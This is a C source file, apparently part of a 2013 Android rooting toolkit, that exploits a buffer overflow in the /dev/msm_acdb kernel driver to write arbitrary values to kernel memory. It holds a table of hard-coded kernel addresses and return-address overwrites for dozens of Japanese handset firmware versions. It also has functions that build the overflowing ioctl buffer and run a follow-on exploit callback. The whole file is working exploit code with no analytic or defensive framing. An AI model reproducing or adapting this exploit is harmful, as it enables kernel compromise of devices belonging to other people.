/*
 *  Copyright (c) 2013 goroh_kun
 *
 *  2013/03/23
 *  goroh.kun@gmail.com
 */

#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

#include <device_database.h>
#include "acdb.h"

typedef struct _param_pair {
  int pos;
  unsigned long int value;
} param_pair;

typedef struct _acdb_param {
  int value_pos;
  int address_pos;
  param_pair pc1;
  param_pair pc2;
} acdb_param;

typedef struct supported_device {
  device_id_t device_id;
  const acdb_param param;
} supported_device;

static supported_device supported_devices[] = {
  { DEVICE_HTL21_1_36_970_1,        { 0x64, 0x70, { 0x74, 0xc01e27a4 }, { 0x94, 0xc000dd0c } } },
  { DEVICE_HTL22_2_15_970_1,        { 0x64, 0x70, { 0x74, 0xc022acb8 }, { 0x94, 0xc000ddac } } },
  { DEVICE_HTL22_2_21_970_2,        { 0x64, 0x70, { 0x74, 0xc022bcd8 }, { 0x94, 0xc000ddbc } } },
  { DEVICE_L01D_V20d,               { 0x68, 0x78, { 0x84, 0xc0417b30 }, { 0xa4, 0xc0381064 } } },
  { DEVICE_L01D_V20e,               { 0x68, 0x78, { 0x84, 0xc0417bf0 }, { 0xa4, 0xc03810ac } } },
  { DEVICE_L02E_V10c,               { 0x7c, 0x8c, { 0x94, 0xc02dc8c4 }, { 0xb4, 0xc018fd58 } } },
  { DEVICE_L02E_V10e,               { 0x7c, 0x8c, { 0x94, 0xc02dc984 }, { 0xb4, 0xc018fd6c } } },
  { DEVICE_L06D_V10k,               { 0x68, 0x78, { 0x84, 0xc041c690 }, { 0xa4, 0xc038c240 } } },
  { DEVICE_L06D_V10p,               { 0x68, 0x78, { 0x84, 0xc041c770 }, { 0xa4, 0xc01031bc } } },
  { DEVICE_N02E_A3002501,           { 0x94, 0xa4, { 0xa8, 0xc0395460 }, { 0xc8, 0xc024a3b4 } } },
  { DEVICE_N02E_A3002601,           { 0x94, 0xa4, { 0xa8, 0xc03953a0 }, { 0xc8, 0xc024a2fc } } },
  { DEVICE_N02E_A5002501,           { 0x94, 0xa4, { 0xa8, 0xc0395460 }, { 0xc8, 0xc024a3b4 } } },
  { DEVICE_N02E_A5002601,           { 0x94, 0xa4, { 0xa8, 0xc03953a0 }, { 0xc8, 0xc024a2fc } } },
  { DEVICE_N03E_A7001821,           { 0x94, 0xa4, { 0xa8, 0xc0397cbc }, { 0xc8, 0xc024ba58 } } },
  { DEVICE_N03E_A7002001,           { 0x94, 0xa4, { 0xa8, 0xc0397ddc }, { 0xc8, 0xc024bb00 } } },
  { DEVICE_N03E_A7202201,           { 0x7c, 0x88, { 0x8c, 0xc0297e1c }, { 0xac, 0xc024be10 } } },
  { DEVICE_N03E_A7202001,           { 0x7c, 0x88, { 0x8c, 0xc0297e1c }, { 0xac, 0xc024be10 } } },
  { DEVICE_SBM203SH_S0024,          { 0x7c, 0x88, { 0x8c, 0xc0247500 }, { 0xac, 0xc0230ab0 } } },
  { DEVICE_SH02E_02_00_03,          { 0x7c, 0x88, { 0x8c, 0xc0247520 }, { 0xac, 0xc02498d8 } } },
  { DEVICE_SH04E_01_00_02,          { 0x7c, 0x88, { 0x8c, 0xc02498e0 }, { 0xac, 0xc000dd1c } } },
  { DEVICE_SH04E_01_00_03,          { 0x7c, 0x88, { 0x8c, 0xc0249a20 }, { 0xac, 0xc024bdd8 } } },
  { DEVICE_SH04E_01_00_04,          { 0x7c, 0x88, { 0x8c, 0xc0249a20 }, { 0xac, 0xc024bdd8 } } },
  { DEVICE_SH05E_01_00_05,          { 0x80, 0x90, { 0x9c, 0xc0381b98 }, { 0xbc, 0xc0231b98 } } },
  { DEVICE_SH05E_01_00_06,          { 0x80, 0x90, { 0x9c, 0xc0381c58 }, { 0xbc, 0xc0231bd4 } } },
  { DEVICE_SH06E_01_00_01,          { 0x7c, 0x88, { 0x8c, 0xc02944b4 }, { 0xac, 0xc000ddac } } },
  { DEVICE_SH06E_01_00_05,          { 0x7c, 0x88, { 0x8c, 0xc0294494 }, { 0xac, 0xc000ddac } } },
  { DEVICE_SH06E_01_00_06,          { 0x7c, 0x88, { 0x8c, 0xc02944b4 }, { 0xac, 0xc000ddac } } },
  { DEVICE_SH06E_01_00_07,          { 0x7c, 0x88, { 0x8c, 0xc02944f4 }, { 0xac, 0xc000ddac } } },
  { DEVICE_SH07E_01_00_03,          { 0x7c, 0x88, { 0x8c, 0xc02946d4 }, { 0xac, 0xc022729c } } },
  { DEVICE_SH09D_02_00_03,          { 0x7c, 0x88, { 0x8c, 0xc0245740 }, { 0xac, 0xc0238d14 } } },
  { DEVICE_SHL21_01_00_09,          { 0x7c, 0x8c, { 0x90, 0xc0380240 }, { 0xb0, 0xc02304a8 } } },
  { DEVICE_SHL21_01_01_02,          { 0x7c, 0x88, { 0x8c, 0xc0246100 }, { 0xac, 0xc02484b8 } } },
  { DEVICE_SO04D_7_0_D_1_137,       { 0x80, 0x90, { 0x9c, 0xc0326a38 }, { 0xbc, 0xc0526964 } } },
  { DEVICE_SO04D_9_1_C_1_103,       { 0x7c, 0x88, { 0x8c, 0xc0240958 }, { 0xac, 0xc003dfd0 } } },
  { DEVICE_SO05D_7_0_D_1_137,       { 0x80, 0x90, { 0x9c, 0xc03265d8 }, { 0xbc, 0xc0524d84 } } },
  { DEVICE_SOL21_9_1_D_0_395,       { 0x7c, 0x88, { 0x8c, 0xc0244778 }, { 0xac, 0xc000dd24 } } },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static const acdb_param *
get_acdb_param(void)
{
  device_id_t device_id = detect_device();
  static acdb_param param;
  int i;

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id == device_id) {
      return &supported_devices[i].param;
    }
  }

  param.value_pos = device_get_symbol_address(DEVICE_SYMBOL(msm_acdb.value_pos));
  param.address_pos = device_get_symbol_address(DEVICE_SYMBOL(msm_acdb.address_pos));
  param.pc1.pos = device_get_symbol_address(DEVICE_SYMBOL(msm_acdb.pc1.pos));
  param.pc1.value = device_get_symbol_address(DEVICE_SYMBOL(msm_acdb.pc1.value));
  param.pc2.pos = device_get_symbol_address(DEVICE_SYMBOL(msm_acdb.pc2.pos));
  param.pc2.value = device_get_symbol_address(DEVICE_SYMBOL(msm_acdb.pc2.value));

  if (param.value_pos
   && param.address_pos
   && param.pc1.pos
   && param.pc1.value
   && param.pc2.pos
   && param.pc2.value) {
    return &param;
  }

  print_reason_device_not_supported();
  return NULL;
}

#define OVERFLOW_BUFFER_SIZE  0x100

struct acdb_ioctl {
    unsigned int size;
    char data[OVERFLOW_BUFFER_SIZE];
};

static int
write_value(const acdb_param *param, unsigned long address, unsigned long value)
{
    const char *device_name = "/dev/msm_acdb";
    struct acdb_ioctl arg;

    int fd;
    int ret;
    int i;

    fd = open(device_name, O_RDONLY);
    if (fd < 0) {
      printf("failed to open %s due to %s.\n", device_name, strerror(errno));
      return -1;
    }

    arg.size = param->pc2.pos + 4;

    for (i = 0; i < arg.size; i += 4) {
      *(unsigned long int *)&arg.data[i] = i;
    }

    *(unsigned long int *)&arg.data[param->address_pos] = address;
    *(unsigned long int *)&arg.data[param->value_pos] = value;
    *(unsigned long int *)&arg.data[param->pc1.pos] = param->pc1.value;
    *(unsigned long int *)&arg.data[param->pc2.pos] = param->pc2.value;

    ret = ioctl(fd, 9999, &arg);
    close(fd);

    return 0;
}

bool
acdb_write_value_at_address(unsigned long address, int value)
{
  const acdb_param *param = get_acdb_param();
  if (!param) {
    return false;
  }

  if (!write_value(param, address, value)) {
    return true;
  }

  return false;
}

bool
acdb_run_exploit(unsigned long int address, int value,
                 bool(*exploit_callback)(void* user_data), void *user_data)
{
  if (!acdb_write_value_at_address(address, value)) {
    return false;
  }

  return exploit_callback(user_data);
}
